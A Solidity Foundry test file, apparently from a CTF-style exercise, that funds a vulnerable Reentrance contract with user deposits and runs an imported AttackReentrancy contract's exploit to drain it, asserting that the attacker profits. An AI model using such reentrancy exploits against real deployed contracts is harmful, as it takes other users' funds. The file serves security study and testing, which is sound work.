// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Reenterancy.sol";
import "../src/Attacks/ReentranceAttack.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract ReentranceTest is Test {
    Reentrance reentrance;
    AttackReentrancy attackReentrancey;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacaker");

    uint256 constant DEPLOYER_DEPOSIT = 3 ether;
    uint256 constant USER1_DEPOSIT = 1 ether;
    uint256 constant USER2_DEPOSIT = 1 ether;

    uint256 attackerBalance;

    function setUp() public {
        vm.deal(deployer,5 ether);
        vm.deal(user1, 3 ether);
        vm.deal(user2, 2 ether);
        vm.deal(attacker, 2 ether);

        attackerBalance = address(attacker).balance;

        vm.startPrank(deployer);
        reentrance = new Reentrance();
        reentrance.donate{value:3 ether}(deployer);
        vm.stopPrank();
    }

    function testExpliot() public {
        assertGt(address(reentrance).balance,1 ether);
        vm.prank(user1);
        reentrance.donate{value : USER1_DEPOSIT}(user1);

        vm.prank(user2);
        reentrance.donate{value: USER2_DEPOSIT}(user2);

        assertEq(address(reentrance).balance, DEPLOYER_DEPOSIT+USER1_DEPOSIT+USER2_DEPOSIT);

        console.log("Balance of Vault: ",address(reentrance).balance);

        vm.startPrank(attacker);
        attackReentrancey = new AttackReentrancy(reentrance);
        attackReentrancey.expliot{value: 1 ether}();
        vm.stopPrank();

        assertGt(address(attacker).balance,2 ether);
        console.log("Balance: ",reentrance.balanceOf(address(attackReentrancey)));
        console.log("Balance of attack reentrance contract: ", address(attackReentrancey).balance);

    }


}